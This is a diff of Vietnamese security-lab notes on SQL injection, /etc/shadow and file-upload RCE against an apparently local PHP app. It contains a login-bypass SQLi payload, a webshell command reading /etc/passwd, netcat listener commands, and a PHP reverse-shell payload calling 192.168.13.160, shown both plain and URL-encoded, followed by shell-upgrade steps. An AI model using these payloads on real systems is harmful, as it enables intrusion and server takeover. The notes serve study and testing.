@@ -1,5 +1,6 @@
 🛡️ Phân Tích Lỗ hổng Bảo mật: SQL Injection & RCE (Không dùng bảng)
 1. 🔍 SQL Injection (SQLi)
+
 SQL Injection là lỗ hổng bảo mật xảy ra khi một ứng dụng web kết hợp dữ liệu người dùng trực tiếp vào câu lệnh SQL mà không có bất kỳ biện pháp xử lý an toàn nào.
 
 Làm sao biết lỗi SQL nào để sử dụng Payload?
@@ -33,13 +34,14 @@ Vì code ghép trực tiếp giá trị do user nhập vào chuỗi SQL mà khô
 SELECT * FROM users WHERE username = '' OR '1'='1' LIMIT 1=> trả về bản ghi đầu tiên (có thể là admin) → bypass đăng nhập.
 
 2. 📁 Tệp /etc/shadow
+
 Tệp /etc/shadow là một thành phần cực kỳ nhạy cảm của hệ thống bảo mật người dùng trên Linux/Unix.
 Chức năng: Tệp này lưu trữ mật khẩu đã được băm (hashed passwords) và thông tin về thời gian hết hạn của mật khẩu cho tất cả người dùng hệ thống.
 Bảo mật: Chỉ người dùng root mới có quyền đọc tệp này. Điều này nhằm bảo vệ các hash mật khẩu khỏi sự truy cập của người dùng thông thường hoặc kẻ tấn công, những người có thể dùng các hash này để thực hiện tấn công bẻ khóa (brute-force) ngoại tuyến.
 Phân biệt với /etc/passwd: Tệp /etc/passwd chỉ chứa thông tin cơ bản của người dùng (username, ID...), và trường mật khẩu của nó chỉ chứa ký tự x hoặc * để chỉ ra rằng mật khẩu thực tế nằm trong /etc/shadow.
 Rủi ro Mật khẩu Ứng dụng: Mật khẩu người dùng trong ứng dụng web (webapp) cần phải được lưu dưới dạng băm mạnh (ví dụ: bcrypt), không bao giờ được lưu dưới dạng văn bản thuần (plaintext), ngay cả trong cơ sở dữ liệu của ứng dụng (ví dụ: data/fap.db).
 
-3. RCE & Unrestricted File Upload:
+4. RCE & Unrestricted File Upload:
 
 Nguy cơ RCE: Xảy ra khi một ứng dụng cho phép người dùng tải lên các tệp có đuôi mở rộng mà máy chủ web có thể thực thi (như .php, .jsp). Kẻ tấn công tải lên một tệp chứa mã độc (webshell) và sau đó truy cập nó để chạy bất kỳ lệnh nào trên máy chủ.
 Unrestricted File Upload (RCE risk)
@@ -51,42 +53,35 @@ Hoặc upload webshell, rồi dùng để leo thang tấn công.
 - Mật khẩu của các user “hệ điều hành” (Linux) nằm ở /etc/shadow (hash, chỉ root đọc); /etc/passwd chỉ chứa một chữ 'x' ở cột password.
 - Mật khẩu của user trong ứng dụng FAP (webapp) nằm trong file SQLite của dự án: `data/fap.db`, bảng `users`, cột `password`. Trong mã nguồn `src/db.php` (hàm seed/ensureSchema) bạn đang lưu mật khẩu ở dạng plaintext (ví dụ 'admin123', 'sv123'...), tức là không băm — đây là rủi ro bảo mật lớn.
 
-**Tệp `/etc/shadow` là gì?**
+Tệp `/etc/shadow` là gì?
 
 - Đây là một trong những tệp tin nhạy cảm nhất trên hệ thống Linux.
 - Nó lưu trữ **mật khẩu đã được băm (hashed passwords)** của tất cả người dùng.
 - Đây là tệp mà kẻ tấn công muốn đọc để lấy các hash này và bẻ khóa chúng (brute-force) offline để tìm ra mật khẩu.
 
-**Các lệnh thực hiện: **
-Lệnh kiếm passwd
+Các lệnh thực hiện:
 
+Lệnh kiếm passwd
 [127.0.0.1:8000/uploads/Untitled-1.php?cmd=cat /etc/passwd](http://127.0.0.1:8000/uploads/Untitled-1.php?cmd=cat%20/etc/passwd)
 
 Lệnh mở ncat
-
 cd "C:\Program Files (x86)\Nmap”
-
 .\ncat.exe -lvnp 4444
 
 Lệnh ncat
-
 nc -lvnp 4444
 
-payload **Reverse Shell**
-
+payload Reverse Shell
 php -r '$sock=fsockopen("192.168.13.160",4444);exec("/bin/sh -i <&3 >&3 2>&3");’
 
 payload đã mã hóa để đưa lên URL
-
 [localhost:8000/uploads/Untitled-1.php?cmd=php -r %27%24sock%3Dfsockopen%28"192.168.13.160"%2C4444%29%3Bexec%28"%2Fbin%2Fsh -i <%263 >%263 2>%263"%29%3B%27](http://localhost:8000/uploads/Untitled-1.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.13.160%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27)
 
 Nâng cấp lên Shell Tương tác (TTY)
-
 script /dev/null -c /bin/bash
 
 **Cấu hình Terminal Kali:**
 Gõ chính xác lệnh này vào terminal Kali của bạn và nhấn Enter:
-
 stty raw -echo
 
 - **Chạy nền Shell:**
@@ -94,10 +89,8 @@ Nhấn tổ hợp phím: **`Ctrl + Z`**
 (Lệnh này sẽ tạm dừng reverse shell và trả bạn về terminal Kali `(kali@kali)-[~]`).
 - **Cấu hình Terminal Kali:**
 Gõ chính xác lệnh này vào terminal Kali của bạn và nhấn Enter:Bash
-    
     `stty raw -echo`
-    
-    (Lệnh này báo cho terminal Kali biết nó sắp nhận dữ liệu "thô").
+(Lệnh này báo cho terminal Kali biết nó sắp nhận dữ liệu "thô").
     
 - **Quay lại Reverse Shell:**
 Gõ `fg` và nhấn **Enter** (có thể cần nhấn 2 lần).
